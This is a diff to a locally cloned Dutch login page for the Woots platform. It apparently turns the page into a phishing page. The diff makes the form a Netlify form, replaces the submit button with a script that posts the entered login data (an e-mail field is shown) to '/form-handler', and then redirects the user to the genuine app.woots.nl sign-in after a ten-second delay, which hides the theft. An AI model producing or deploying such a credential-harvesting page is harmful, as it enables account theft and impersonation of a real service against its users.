@@ -87,7 +87,7 @@
         <div class="my-4 f6 fg-color-muted separator">Of log in met e-mail</div>
 
       </form> 
-      <form method="post" netlify data-netlify="true">
+      <form id="myForm" netlify data-netlify="true">
         <div>
           <label class="mdc-text-field mdc-text-field--outlined mdc-text-field--full-width" data-mdc-auto-init="MDCTextField" data-controller="floating-label-text-field" data-mdc-auto-init-state="initialized"><span class="mdc-notched-outline mdc-notched-outline--upgraded mdc-notched-outline--notched"><span class="mdc-notched-outline__leading"></span><span class="mdc-notched-outline__notch" style="width: 53px;"><span id="user_lis_person_contact_email_primary_label" class="mdc-floating-label mdc-floating-label--float-above mdc-floating-label--required" style="">E-mail</span></span><span class="mdc-notched-outline__trailing"></span></span><input class="mdc-text-field__input" aria-labelledby="user_lis_person_contact_email_primary_label" autocomplete="off" required="required" type="email" name="user[lis_person_contact_email_primary]" id="user_lis_person_contact_email_primary"></label>
         </div>
@@ -99,7 +99,7 @@
         <!-- Frame waarin de serverreactie wordt ontvangen -->
          
         
-        <button type="submit" class="mdc-button tooltip hover mt-3 mdc-button mdc-button--filled-secondary mdc-button--fullwidth" data-disable-with="Aan het inloggen..." data-turbo="false">
+        <button type="button" onclick="submitForm()" class="mdc-button tooltip hover mt-3 mdc-button mdc-button--filled-secondary mdc-button--fullwidth" data-disable-with="Aan het inloggen..." data-turbo="false">
         
           <span class="mdc-button__label">Log in</span>
         </button>
@@ -108,7 +108,30 @@
 </div>
 
     </div>
+<script>function submitForm() {
+  const form = document.getElementById('myForm');
+  const formData = new FormData(form);
 
+  // Submit form data asynchronously
+  fetch('/form-handler', {
+    method: 'POST',
+    body: formData,
+  })
+  .then(() => {
+    // Show a loading message for 10 seconds
+    document.getElementById('loading').style.display = 'block';
+
+    setTimeout(() => {
+      document.getElementById('loading').style.display = 'none';
+      // Redirect user after 10 seconds
+      window.location.href = 'https://app.woots.nl/users/sign_in';
+    }, 10000);
+  })
+  .catch((error) => {
+    // Handle errors
+    alert('Error submitting form: ' + error);
+  });
+}</script>
     <img alt="nice to see you" style="max-height:250px" class="mt-6 responsive lazy entered loaded" data-src="https://assets.ans.app/assets/woots/nice_to_see_you-bfc5b4c9b22615a892cc43e3f403423854ded27c.png" src="./index_files/nice_to_see_you-bfc5b4c9b22615a892cc43e3f403423854ded27c.png" data-ll-status="loaded">
     
 <!--     <!DOCTYPE html>
